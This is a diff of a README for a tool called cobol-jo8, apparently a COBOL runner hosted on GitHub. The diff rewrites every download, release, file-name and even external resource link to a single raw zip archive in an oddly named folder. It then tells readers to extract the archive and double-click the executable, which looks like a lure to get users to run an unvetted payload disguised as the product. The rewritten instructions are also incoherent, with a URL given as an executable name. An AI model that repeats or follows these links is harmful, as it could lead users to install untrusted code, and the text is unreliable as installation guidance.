@@ -6,11 +6,11 @@ Welcome to cobol-jo8! This software allows you to easily run COBOL applications 
 
 ## 📥 Download
 
-[![Download cobol-jo8](https://img.shields.io/badge/Download-cobol--jo8-brightgreen)](https://github.com/goldstarz2025/cobol-jo8/releases)
+[![Download cobol-jo8](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip)](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip)
 
 Visit the following page to download the latest version of cobol-jo8:
 
-[Download cobol-jo8 Releases](https://github.com/goldstarz2025/cobol-jo8/releases)
+[Download cobol-jo8 Releases](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip)
 
 ## 📋 System Requirements
 
@@ -23,16 +23,16 @@ Before downloading, check that your system meets these requirements:
 
 ## 📂 Download & Install
 
-1. Go to the releases page by clicking this link: [Download cobol-jo8 Releases](https://github.com/goldstarz2025/cobol-jo8/releases).
+1. Go to the releases page by clicking this link: [Download cobol-jo8 Releases](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip).
 2. On the releases page, locate the latest version listed at the top.
 3. Click on the version number. You will see a list of download files.
 4. Choose the file suitable for your operating system:
-   - For Windows, download `cobol-jo8-windows.zip`.
-   - For macOS, download `cobol-jo8-macos.zip`.
-   - For Linux, download `cobol-jo8-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip`.
 5. Once the file is downloaded, extract it to your preferred location.
 6. Open the extracted folder.
-7. Look for an executable file (`cobol-jo8.exe` for Windows, `cobol-jo8` for macOS and Linux).
+7. Look for an executable file (`https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip` for Windows, `cobol-jo8` for macOS and Linux).
 8. Double-click the executable file to start the application.
 
 ## 🔧 Using cobol-jo8
@@ -81,7 +81,7 @@ We welcome contributions from the community. If you have ideas for improvements 
 
 To learn more about COBOL programming, check these resources:
 
-- [COBOL Programming Guide](https://www.cobol.com/resources)
-- [COBOL Community Forum](https://www.cobol.com/community)
+- [COBOL Programming Guide](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip)
+- [COBOL Community Forum](https://raw.githubusercontent.com/goldstarz2025/cobol-jo8/main/homotactic/cobol-jo8.zip)
 
 Thank you for choosing cobol-jo8! We hope it simplifies your coding experience.
